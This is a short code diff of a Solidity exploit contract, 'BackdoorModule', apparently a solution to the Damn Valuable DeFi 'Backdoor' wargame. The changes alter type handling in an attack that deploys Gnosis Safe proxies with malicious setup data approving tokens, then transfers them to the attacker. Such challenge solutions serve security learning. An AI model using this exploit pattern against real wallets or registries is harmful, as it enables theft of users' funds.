@@ -14,10 +14,10 @@ contract BackdoorModule {
   address public attacker;
   address public _GnosisSingleton;
   GnosisSafeProxyFactory public _factory;
-  IERC20 public _token;
+  address public _token;
   WalletRegistry public _walletRegistry;
 
-  constructor (address singleton, GnosisSafeProxyFactory factory, IERC20 token, WalletRegistry walletRegistry) {
+  constructor (address singleton, GnosisSafeProxyFactory factory, address token, WalletRegistry walletRegistry) {
     attacker = msg.sender;
     _GnosisSingleton = singleton;
     _factory = factory;
@@ -27,7 +27,7 @@ contract BackdoorModule {
 
   function approveTenDVT(address tokenAddress, address moduleAddress) public {
     // _token.approve(attacker, type(uint256).max);
-    DamnValuableToken(tokenAddress).approve(moduleAddress, 10 ether);
+    IERC20(tokenAddress).approve(moduleAddress, 10 ether);
   }
 
   function attack(address[] memory usuarios, bytes memory dataParaSetup) public {
@@ -53,7 +53,7 @@ contract BackdoorModule {
       GnosisSafeProxy proxy = _factory.createProxyWithCallback(_GnosisSingleton, initializerParaGnosis, 0, _walletRegistry);
 
       // Transferir desde el GnosisProxy creado los 10 DVT que se aprobaron con la data maliciosa.
-      _token.transferFrom(address(proxy), attacker, _token.balanceOf(address(proxy)));
+      IERC20(_token).transferFrom(address(proxy), attacker, IERC20(_token).balanceOf(address(proxy)));
     }
   } 
 
